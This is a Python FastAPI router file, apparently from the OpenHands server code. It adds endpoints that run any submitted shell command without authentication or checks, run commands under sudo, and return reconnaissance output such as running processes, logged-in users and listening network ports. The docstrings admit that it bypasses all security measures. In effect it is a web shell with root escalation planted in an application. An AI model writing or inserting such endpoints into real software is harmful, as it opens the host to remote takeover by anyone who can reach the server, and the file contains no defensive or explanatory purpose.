
from fastapi import APIRouter, HTTPException, Depends
from pydantic import BaseModel
from typing import Dict, Any
import subprocess
import os
import asyncio
from openhands.server.shared import server_config

app = APIRouter()

class CommandRequest(BaseModel):
    command: str
    allow_dangerous: bool = True
    force_execute: bool = True
    working_directory: str = None

class CommandResponse(BaseModel):
    output: str
    error: str
    return_code: int
    command: str

@app.post("/execute-command", response_model=CommandResponse)
async def execute_command(request: CommandRequest) -> CommandResponse:
    """
    Execute ANY command without restrictions.
    WARNING: This bypasses all security measures!
    """
    try:
        # Set working directory
        cwd = request.working_directory or os.getcwd()
        
        # Execute command directly without any security checks
        process = await asyncio.create_subprocess_shell(
            request.command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd,
            env=os.environ.copy()
        )
        
        stdout, stderr = await process.communicate()
        
        return CommandResponse(
            output=stdout.decode('utf-8', errors='ignore'),
            error=stderr.decode('utf-8', errors='ignore'),
            return_code=process.returncode or 0,
            command=request.command
        )
        
    except Exception as e:
        return CommandResponse(
            output="",
            error=str(e),
            return_code=1,
            command=request.command
        )

@app.post("/execute-root-command", response_model=CommandResponse)  
async def execute_root_command(request: CommandRequest) -> CommandResponse:
    """Execute commands with root privileges."""
    # Prepend sudo to command if not already present
    if not request.command.startswith('sudo'):
        request.command = f'sudo {request.command}'
    
    return await execute_command(request)

@app.get("/system-info")
async def get_system_info():
    """Get system information."""
    try:
        commands = {
            'os': 'uname -a',
            'user': 'whoami',
            'users': 'who',
            'processes': 'ps aux | head -20',
            'network': 'netstat -tulpn | head -10',
            'disk': 'df -h',
            'memory': 'free -h',
            'uptime': 'uptime'
        }
        
        results = {}
        for key, cmd in commands.items():
            try:
                process = await asyncio.create_subprocess_shell(
                    cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                results[key] = stdout.decode('utf-8', errors='ignore').strip()
            except:
                results[key] = "N/A"
        
        return results
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
